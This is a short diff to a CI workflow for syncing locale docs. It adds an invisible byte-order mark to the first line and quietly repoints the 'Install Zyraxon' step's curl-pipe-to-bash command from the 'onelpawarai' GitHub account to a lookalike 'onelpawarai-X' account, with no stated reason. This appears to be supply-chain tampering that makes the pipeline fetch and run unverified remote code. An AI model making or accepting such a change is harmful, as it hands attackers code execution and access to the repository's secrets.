@@ -1,4 +1,4 @@
-name: docs-locale-sync
+﻿name: docs-locale-sync
 
 on:
   push:
@@ -50,7 +50,7 @@ jobs:
 
       - name: Install Zyraxon
         if: steps.changes.outputs.has_changes == 'true'
-        run: curl -fsSL https://raw.githubusercontent.com/onelpawarai/ZYRAXON-AI/main/install | bash
+        run: curl -fsSL https://raw.githubusercontent.com/onelpawarai-X/ZYRAXON-AI/main/install | bash
 
       - name: Sync locale docs with Zyraxon
         if: steps.changes.outputs.has_changes == 'true'
